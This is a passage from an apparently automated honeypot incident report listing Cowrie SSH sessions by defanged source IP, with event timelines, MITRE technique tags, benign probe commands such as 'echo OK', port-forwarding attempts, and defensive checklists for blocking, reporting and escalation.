| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:14:42` | `cowrie.session.connect` |
| `2026-07-16 06:14:42` | `cowrie.client.version` |
| `2026-07-16 06:14:42` | `cowrie.client.kex` |
| `2026-07-16 06:14:43` | `cowrie.login.success` |
| `2026-07-16 06:14:43` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:14:43` | `cowrie.direct-tcpip.ja4` |
| `2026-07-16 06:14:43` | `cowrie.direct-tcpip.data` |
| `2026-07-16 06:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e92bb4ff8681

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 06:17 |
| **Last Seen** | 2026-07-16 06:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:17:09` | `cowrie.session.connect` |
| `2026-07-16 06:17:09` | `cowrie.client.version` |
| `2026-07-16 06:17:09` | `cowrie.client.kex` |
| `2026-07-16 06:17:10` | `cowrie.login.success` |
| `2026-07-16 06:17:12` | `cowrie.session.params` |
| `2026-07-16 06:17:12` | `cowrie.command.input` |
| `2026-07-16 06:17:12` | `cowrie.log.closed` |
| `2026-07-16 06:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dddb81e6eb4e

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-07-16 06:19 |
| **Last Seen** | 2026-07-16 06:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:19:38` | `cowrie.session.connect` |
| `2026-07-16 06:19:39` | `cowrie.client.version` |
| `2026-07-16 06:19:39` | `cowrie.client.kex` |
| `2026-07-16 06:19:41` | `cowrie.login.success` |
| `2026-07-16 06:19:42` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:19:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93cee0d33700

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]50` |
| **First Seen** | 2026-07-16 06:23 |
| **Last Seen** | 2026-07-16 06:23 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:23:11` | `cowrie.session.connect` |
| `2026-07-16 06:23:12` | `cowrie.client.version` |
| `2026-07-16 06:23:12` | `cowrie.client.kex` |
| `2026-07-16 06:23:16` | `cowrie.login.success` |
| `2026-07-16 06:23:17` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]50` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5066d6e6441

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-07-16 06:23 |
| **Last Seen** | 2026-07-16 06:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:23:27` | `cowrie.session.connect` |
| `2026-07-16 06:23:27` | `cowrie.client.version` |
| `2026-07-16 06:23:27` | `cowrie.client.kex` |
| `2026-07-16 06:23:30` | `cowrie.login.success` |
| `2026-07-16 06:23:31` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a8f74f6c97

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 06:33 |
| **Last Seen** | 2026-07-16 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:33:33` | `cowrie.session.connect` |
| `2026-07-16 06:33:33` | `cowrie.client.version` |
| `2026-07-16 06:33:33` | `cowrie.client.kex` |
| `2026-07-16 06:33:34` | `cowrie.login.success` |
| `2026-07-16 06:33:34` | `cowrie.session.params` |
| `2026-07-16 06:33:34` | `cowrie.command.input` |
| `2026-07-16 06:33:34` | `cowrie.log.closed` |
| `2026-07-16 06:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ac28f88c0e7

| Field | Detail |
|---|---|
| **Source IP** | `36.64.211[.]93` |
| **First Seen** | 2026-07-16 06:38 |
| **Last Seen** | 2026-07-16 06:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:38:59` | `cowrie.session.connect` |
| `2026-07-16 06:39:00` | `cowrie.client.version` |
| `2026-07-16 06:39:00` | `cowrie.client.kex` |
| `2026-07-16 06:39:02` | `cowrie.login.success` |
| `2026-07-16 06:39:04` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.211[.]93` to AbuseIPDB if not already reported
- [ ] Block `36.64.211[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f8755c4ffe

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-07-16 06:39 |
| **Last Seen** | 2026-07-16 06:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:39:14` | `cowrie.session.connect` |
| `2026-07-16 06:39:14` | `cowrie.client.version` |
| `2026-07-16 06:39:14` | `cowrie.client.kex` |
| `2026-07-16 06:39:16` | `cowrie.login.success` |
| `2026-07-16 06:39:16` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79946c831a09

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 06:47 |
| **Last Seen** | 2026-07-16 06:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:47:11` | `cowrie.session.connect` |
| `2026-07-16 06:47:11` | `cowrie.client.version` |
| `2026-07-16 06:47:12` | `cowrie.client.kex` |
| `2026-07-16 06:47:12` | `cowrie.login.success` |
| `2026-07-16 06:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2735ee5db534

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-16 06:48 |
| **Last Seen** | 2026-07-16 06:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:48:07` | `cowrie.session.connect` |
| `2026-07-16 06:48:08` | `cowrie.client.version` |
| `2026-07-16 06:48:08` | `cowrie.client.kex` |
| `2026-07-16 06:48:09` | `cowrie.login.success` |
| `2026-07-16 06:48:10` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f62af1d24ad

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]2` |
| **First Seen** | 2026-07-16 06:48 |
| **Last Seen** | 2026-07-16 06:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:48:19` | `cowrie.session.connect` |
| `2026-07-16 06:48:20` | `cowrie.client.version` |
| `2026-07-16 06:48:21` | `cowrie.client.kex` |
| `2026-07-16 06:48:23` | `cowrie.login.success` |
| `2026-07-16 06:48:24` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]2` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5e62d564fed

| Field | Detail |
|---|---|
| **Source IP** | `34.78.42[.]11` |
| **First Seen** | 2026-07-16 06:49 |
| **Last Seen** | 2026-07-16 06:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:49:45` | `cowrie.session.connect` |
| `2026-07-16 06:49:45` | `cowrie.login.success` |
| `2026-07-16 06:49:46` | `cowrie.session.params` |
| `2026-07-16 06:49:46` | `cowrie.command.input` |
| `2026-07-16 06:49:46` | `cowrie.command.input` |
| `2026-07-16 06:49:46` | `cowrie.command.failed` |
| `2026-07-16 06:49:46` | `cowrie.command.input` |
| `2026-07-16 06:49:46` | `cowrie.log.closed` |
| `2026-07-16 06:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.42[.]11` to AbuseIPDB if not already reported
- [ ] Block `34.78.42[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8dfad4a6e30

| Field | Detail |
|---|---|
| **Source IP** | `34.78.42[.]11` |
| **First Seen** | 2026-07-16 06:49 |
| **Last Seen** | 2026-07-16 06:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:49:54` | `cowrie.session.connect` |
| `2026-07-16 06:49:54` | `cowrie.login.success` |
| `2026-07-16 06:49:54` | `cowrie.session.params` |
| `2026-07-16 06:49:54` | `cowrie.command.input` |
| `2026-07-16 06:49:54` | `cowrie.command.failed` |
| `2026-07-16 06:49:59` | `cowrie.log.closed` |
| `2026-07-16 06:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.42[.]11` to AbuseIPDB if not already reported
- [ ] Block `34.78.42[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c17200438d4

| Field | Detail |
|---|---|
| **Source IP** | `34.78.42[.]11` |
| **First Seen** | 2026-07-16 06:49 |
| **Last Seen** | 2026-07-16 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:49:56` | `cowrie.session.connect` |
| `2026-07-16 06:49:56` | `cowrie.login.success` |
| `2026-07-16 06:49:56` | `cowrie.session.params` |
| `2026-07-16 06:49:56` | `cowrie.command.input` |
| `2026-07-16 06:49:59` | `cowrie.log.closed` |
| `2026-07-16 06:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.42[.]11` to AbuseIPDB if not already reported
- [ ] Block `34.78.42[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ae12e98ce7

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-07-16 06:51 |
| **Last Seen** | 2026-07-16 06:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:51:42` | `cowrie.session.connect` |
| `2026-07-16 06:51:43` | `cowrie.client.version` |
| `2026-07-16 06:51:43` | `cowrie.client.kex` |
| `2026-07-16 06:51:45` | `cowrie.login.success` |
| `2026-07-16 06:51:46` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4f9dc593aa

| Field | Detail |
|---|---|
| **Source IP** | `59.34.17[.]130` |
| **First Seen** | 2026-07-16 06:51 |
| **Last Seen** | 2026-07-16 06:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 06:51:51` | `cowrie.session.connect` |
| `2026-07-16 06:51:52` | `cowrie.client.version` |
| `2026-07-16 06:51:52` | `cowrie.client.kex` |
| `2026-07-16 06:51:55` | `cowrie.login.success` |
| `2026-07-16 06:51:56` | `cowrie.direct-tcpip.request` |
| `2026-07-16 06:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.34.17[.]130` to AbuseIPDB if not already reported
- [ ] Block `59.34.17[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74b541a1e3fd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 07:05 |
| **Last Seen** | 2026-07-16 07:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:05:59` | `cowrie.session.connect` |
| `2026-07-16 07:05:59` | `cowrie.client.version` |
| `2026-07-16 07:05:59` | `cowrie.client.kex` |
| `2026-07-16 07:05:59` | `cowrie.login.success` |
| `2026-07-16 07:06:00` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:06:00` | `cowrie.direct-tcpip.data` |
| `2026-07-16 07:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5036cd50cbb6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 07:08 |
| **Last Seen** | 2026-07-16 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:08:10` | `cowrie.session.connect` |
| `2026-07-16 07:08:10` | `cowrie.client.version` |
| `2026-07-16 07:08:10` | `cowrie.client.kex` |
| `2026-07-16 07:08:10` | `cowrie.login.success` |
| `2026-07-16 07:08:11` | `cowrie.session.params` |
| `2026-07-16 07:08:11` | `cowrie.command.input` |
| `2026-07-16 07:08:11` | `cowrie.log.closed` |
| `2026-07-16 07:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f970f36ececb

| Field | Detail |
|---|---|
| **Source IP** | `36.64.36[.]101` |
| **First Seen** | 2026-07-16 07:09 |
| **Last Seen** | 2026-07-16 07:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:09:50` | `cowrie.session.connect` |
| `2026-07-16 07:09:51` | `cowrie.client.version` |
| `2026-07-16 07:09:51` | `cowrie.client.kex` |
| `2026-07-16 07:09:53` | `cowrie.login.success` |
| `2026-07-16 07:09:54` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.36[.]101` to AbuseIPDB if not already reported
- [ ] Block `36.64.36[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe92d620446d

| Field | Detail |
|---|---|
| **Source IP** | `191.241.142[.]170` |
| **First Seen** | 2026-07-16 07:13 |
| **Last Seen** | 2026-07-16 07:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:13:18` | `cowrie.session.connect` |
| `2026-07-16 07:13:19` | `cowrie.client.version` |
| `2026-07-16 07:13:19` | `cowrie.client.kex` |
| `2026-07-16 07:13:22` | `cowrie.login.success` |
| `2026-07-16 07:13:23` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:13:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.241.142[.]170` to AbuseIPDB if not already reported
- [ ] Block `191.241.142[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11cbbe7a523c

| Field | Detail |
|---|---|
| **Source IP** | `117.250.250[.]2` |
| **First Seen** | 2026-07-16 07:13 |
| **Last Seen** | 2026-07-16 07:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:13:28` | `cowrie.session.connect` |
| `2026-07-16 07:13:28` | `cowrie.client.version` |
| `2026-07-16 07:13:28` | `cowrie.client.kex` |
| `2026-07-16 07:13:30` | `cowrie.login.success` |
| `2026-07-16 07:13:31` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.250.250[.]2` to AbuseIPDB if not already reported
- [ ] Block `117.250.250[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2543f2bfc0e

| Field | Detail |
|---|---|
| **Source IP** | `83.239.0[.]202` |
| **First Seen** | 2026-07-16 07:20 |
| **Last Seen** | 2026-07-16 07:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:20:18` | `cowrie.session.connect` |
| `2026-07-16 07:20:19` | `cowrie.client.version` |
| `2026-07-16 07:20:19` | `cowrie.client.kex` |
| `2026-07-16 07:20:20` | `cowrie.login.success` |
| `2026-07-16 07:20:20` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.0[.]202` to AbuseIPDB if not already reported
- [ ] Block `83.239.0[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0dfd8320e7

| Field | Detail |
|---|---|
| **Source IP** | `65.20.250[.]180` |
| **First Seen** | 2026-07-16 07:20 |
| **Last Seen** | 2026-07-16 07:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:20:25` | `cowrie.session.connect` |
| `2026-07-16 07:20:26` | `cowrie.client.version` |
| `2026-07-16 07:20:26` | `cowrie.client.kex` |
| `2026-07-16 07:20:27` | `cowrie.login.success` |
| `2026-07-16 07:20:27` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.250[.]180` to AbuseIPDB if not already reported
- [ ] Block `65.20.250[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec3d32fb1b8

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 07:24 |
| **Last Seen** | 2026-07-16 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:24:32` | `cowrie.session.connect` |
| `2026-07-16 07:24:32` | `cowrie.client.version` |
| `2026-07-16 07:24:32` | `cowrie.client.kex` |
| `2026-07-16 07:24:33` | `cowrie.login.success` |
| `2026-07-16 07:24:33` | `cowrie.session.params` |
| `2026-07-16 07:24:33` | `cowrie.command.input` |
| `2026-07-16 07:24:33` | `cowrie.log.closed` |
| `2026-07-16 07:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b2c980c84d3

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-07-16 07:25 |
| **Last Seen** | 2026-07-16 07:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:25:39` | `cowrie.session.connect` |
| `2026-07-16 07:25:39` | `cowrie.client.version` |
| `2026-07-16 07:25:39` | `cowrie.client.kex` |
| `2026-07-16 07:25:41` | `cowrie.login.success` |
| `2026-07-16 07:25:42` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b807008b8bc

| Field | Detail |
|---|---|
| **Source IP** | `191.36.152[.]28` |
| **First Seen** | 2026-07-16 07:25 |
| **Last Seen** | 2026-07-16 07:30 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 07:25:48` | `cowrie.session.connect` |
| `2026-07-16 07:25:48` | `cowrie.client.version` |
| `2026-07-16 07:25:48` | `cowrie.client.kex` |
| `2026-07-16 07:25:50` | `cowrie.login.success` |
| `2026-07-16 07:25:51` | `cowrie.direct-tcpip.request` |
| `2026-07-16 07:30:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.36.152[.]28` to AbuseIPDB if not already reported
- [ ] Block `191.36.152[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ca354d70513

| Field | Detail |
